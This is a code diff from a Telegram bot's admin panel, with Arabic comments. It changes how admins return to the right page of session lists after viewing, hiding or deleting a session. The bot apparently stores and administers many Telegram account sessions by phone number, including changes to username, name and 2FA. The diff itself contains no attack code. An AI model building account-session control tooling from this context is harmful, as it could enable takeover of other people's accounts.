@@ -858,11 +858,15 @@ async def session_detail(callback: CallbackQuery, state: FSMContext):
     session = await admin_resolve.get_session_from_callback(callback.data, "session")
     if not await _guard_session_row(callback, session):
         return
-    
+
+    # اقرأ بيانات التنقل أولاً، ثم امسح حالة الانتظار الفعّالة (تغيير يوزر/اسم/2FA/...)
     st_data = await state.get_data()
-    page = st_data.get("last_page", 0)
+    page   = st_data.get("last_page", 0)
     source = st_data.get("last_source", "main")
-    
+    await state.clear()
+    # أعد تخزين بيانات التنقل حتى تبقى بعد المسح
+    await state.update_data(last_page=page, last_source=source)
+
     await _render_session_detail(callback, session, page=page, source=source)
     await callback.answer()
 
@@ -893,7 +897,7 @@ async def back_to_sessions(callback: CallbackQuery, state: FSMContext):
 # أزرار الجلسة (id في callback — لا يُقطع رقم الهاتف)
 # ──────────────────────────────────────────
 @dp.callback_query(F.data.regexp(r"^h\d+$"))
-async def a1_hide_session(callback: CallbackQuery):
+async def a1_hide_session(callback: CallbackQuery, state: FSMContext):
     if not is_super_admin(callback.from_user.id):
         await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
         return
@@ -913,13 +917,28 @@ async def a1_hide_session(callback: CallbackQuery):
     else:
         await callback.answer("☆ ظهر للأدمنية مرة أخرى", show_alert=True)
     uid = callback.from_user.id
+
+    # ارجع للصفحة التي كان فيها الأدمن قبل الدخول للتفاصيل
+    st_data = await state.get_data()
+    page   = st_data.get("last_page", 0)
+    source = st_data.get("last_source", "main")
+
     sessions = await _sessions_for_admin(uid)
     text = await _admin_panel_text(uid)
-    await callback.message.edit_text(
-        text,
-        reply_markup=sessions_keyboard(sessions, 0, is_super_admin=True),
-        parse_mode="HTML",
-    )
+
+    if source == "unsecured":
+        from keyboards import unsecured_sessions_keyboard
+        kb = unsecured_sessions_keyboard(sessions, page=page)
+    elif source == "disabled":
+        from keyboards import disabled_sessions_keyboard
+        kb = disabled_sessions_keyboard(sessions, page=page)
+    else:
+        per_page = 6
+        max_page = max(0, (len(sessions) - 1) // per_page) if sessions else 0
+        page = min(page, max_page)
+        kb = sessions_keyboard(sessions, page=page, is_super_admin=True)
+
+    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
 
 
 @dp.callback_query(F.data.regexp(r"^x\d+$"))
@@ -1520,7 +1539,7 @@ async def export_secured_sessions_txt(callback: CallbackQuery):
 # حذف جلسة فردية نهائياً
 # ──────────────────────────────────────────
 @dp.callback_query(F.data.regexp(r"^d\d+$"))
-async def delete_single_session(callback: CallbackQuery):
+async def delete_single_session(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
@@ -1533,11 +1552,27 @@ async def delete_single_session(callback: CallbackQuery):
     await database.delete_session(phone)
     await callback.answer(f"✅ تم حذف {phone} نهائياً.", show_alert=True)
 
+    # ارجع للصفحة التي كان فيها الأدمن قبل الدخول للتفاصيل
+    st_data = await state.get_data()
+    page   = st_data.get("last_page", 0)
+    source = st_data.get("last_source", "main")
+
     sessions = await _sessions_for_admin(uid)
     text = await _admin_panel_text(uid)
-    kb = sessions_keyboard(
-        sessions, is_super_admin=is_super_admin(uid)
-    ) if sessions else None
+
+    if source == "unsecured":
+        from keyboards import unsecured_sessions_keyboard
+        kb = unsecured_sessions_keyboard(sessions, page=page) if sessions else None
+    elif source == "disabled":
+        from keyboards import disabled_sessions_keyboard
+        kb = disabled_sessions_keyboard(sessions, page=page) if sessions else None
+    else:
+        # تأكد أن الصفحة لا تتجاوز ما هو متاح بعد الحذف
+        per_page = 6
+        max_page = max(0, (len(sessions) - 1) // per_page) if sessions else 0
+        page = min(page, max_page)
+        kb = sessions_keyboard(sessions, page=page, is_super_admin=is_super_admin(uid)) if sessions else None
+
     suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
     await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")
 
